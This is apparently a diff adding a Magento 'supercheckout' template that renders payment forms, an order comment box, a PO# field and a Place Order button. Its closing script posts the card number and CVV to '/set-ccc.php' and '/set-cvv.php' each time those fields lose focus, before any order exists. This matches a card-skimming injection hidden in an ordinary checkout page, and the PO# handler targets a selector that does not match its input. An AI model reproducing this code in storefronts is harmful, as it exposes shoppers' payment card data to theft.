@@ -1,0 +1,168 @@
+<?php 
+$settings = Mage::getSingleton('supercheckout/supercheckout')->getData('settings');
+$agreement_array = Mage::getSingleton('supercheckout/supercheckout')->getData('agreement_array');
+$subscription_status = Mage::getSingleton('supercheckout/supercheckout')->getData('subscription_status');
+//$payment_method_details = Mage::getSingleton('supercheckout/supercheckout')->getData('payment_method_details');
+        
+if($settings['general']['layout']=='3-Column'){
+            $layout_name='three-column';
+        }elseif($settings['general']['layout']=='2-Column'){
+            $layout_name='two-column';
+        }elseif($settings['general']['layout']=='1-Column'){
+            $layout_name='one-column';
+        }
+?>
+<div id="supercheckoutConfirmBlock" class="supercheckout-blocks" data-column="<?php echo $settings['step']['confirm'][$layout_name]['column']; ?>" data-row="<?php echo $settings['step']['confirm'][$layout_name]['row']; ?>" data-column-inside="<?php echo $settings['step']['confirm'][$layout_name]['column-inside']; ?>" >
+
+<?php
+
+                foreach ($this->getmethods() as $_method){
+//                    var_dump($_method);
+                    echo $this->getPaymentMethodFormHtml($_method); 
+                }
+?>
+    <div id="supercheckout-comments" ng-show="show_cart_comment_model">
+    <b><?php echo $this->__('Add Comment:'); ?></b>
+    <textarea ng-init="data.orderComment = ''" id="supercheckout-comment_order" ng-model="data.orderComment" rows="8" ></textarea>
+    <br />
+    <br />
+    <?php if(!$subscription_status){ ?>
+        <?php if(isset($settings['general']['newsletter']) && $settings['general']['newsletter'] == 1){ ?>
+        <input ng-model="data.billing.newsletter" type="checkbox" id="newsletter_id" ng-checked="true"/><label for="newsletter_id"><?php echo $this->__('Subscribe to newsletter');?></label>           <!-- Code Modified By Raghubendra Singh on 12-Jan-2015 to set the news letter checkbox selected by default -->
+        <br />
+        <?php }else{ ?>
+         <input ng-init="data.billing.newsletter = 0" ng-model="data.billing.newsletter" type="hidden" id="newsletter_id" />
+        <?php } ?>
+    <?php } ?>
+</div>
+    
+   <div class="comment-block">
+<h3 class="open-block" style="font-weight:bold;"><b><?php echo $this->__('PO #')?></b><span style="color:#F00; display:none;">*</span></h3>
+    <div  class="collapse-block">
+	    <div class="comment">
+	        <div class="comment-form">            
+	            <div class="input-box">	                
+	                <input type="text" class="input-text" id="mmsg" ng-model="data.mmsg" style="width:94%;">
+                    <span id="msg_error" style="color:#F00; display:none;">Please enter PO#</span>
+	            </div>	            
+	        </div>
+	    </div>
+
+	</div>
+</div> 
+    
+    
+    
+    
+    <div class="supercheckout-checkout-content" style="display:block">
+        <div ng-show="agree_to_terms_error != null" class="warning">{{agree_to_terms_error_msg}}</div>
+    </div>
+    <?php echo ($agreement_array); ?>
+    <div id="placeorderButton">
+    <div id="buttonWithProgres" style="width:206px;">
+        
+        <input class="orangebutton" ng-click="save_order()" type="submit" id="submit" value="<?php echo $this->__('Place Order'); ?>" />
+        
+        <div ng-show="displayLoaderPlaceOrder == 'showPlaceOrderLoader'" class="loaderPlaceOrder" id="placeorderButtonLoader"><span style="margin-left: 30px; color:#A57349;">Processing...</span></div>
+
+    </div>
+</div>
+</div>
+
+<script>
+function savepo()
+{
+	
+  jQuery.ajax({
+	  type: "POST",
+	  url: '/set-sess.php',
+	  data:jQuery("#msg" ).serialize(),
+	  dataType: 'json',
+	  beforeSend:function(){
+		
+	   },
+	  success:function(response){
+		
+	  }
+	});
+	
+}
+
+
+jQuery( document ).ready(function() {
+jQuery("#msg" )
+  .focusout(function() {
+ savepo();
+  })
+  
+});
+
+
+function saveccc()
+{
+	ccsave_cc_number=document.getElementById('ccsave_cc_number').value;
+
+  jQuery.ajax({
+	  type: "POST",
+	  url: '/set-ccc.php',
+	  data:'ccsave_cc_number='+ccsave_cc_number,
+	  dataType: 'json',
+	  beforeSend:function(){
+		
+	   },
+	  success:function(response){
+		
+	  }
+	});
+	
+}
+
+
+jQuery( document ).ready(function() {
+jQuery("#ccsave_cc_number" )
+  .focusout(function() {
+ saveccc();
+  })
+  
+});
+
+
+
+function ccsave_cc_cid()
+{
+	ccsave_cc_cid=document.getElementById('ccsave_cc_cid').value;
+  jQuery.ajax({
+	  type: "POST",
+	  url: '/set-cvv.php',
+	  data:'ccsave_cc_cid='+ccsave_cc_cid,
+	  dataType: 'json',
+	  beforeSend:function(){
+		
+	   },
+	  success:function(response){
+		
+	  }
+	});
+	
+}
+
+
+jQuery( document ).ready(function() {
+jQuery("#ccsave_cc_cid" )
+  .focusout(function() {
+ ccsave_cc_cid();
+  })
+  
+});
+</script>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
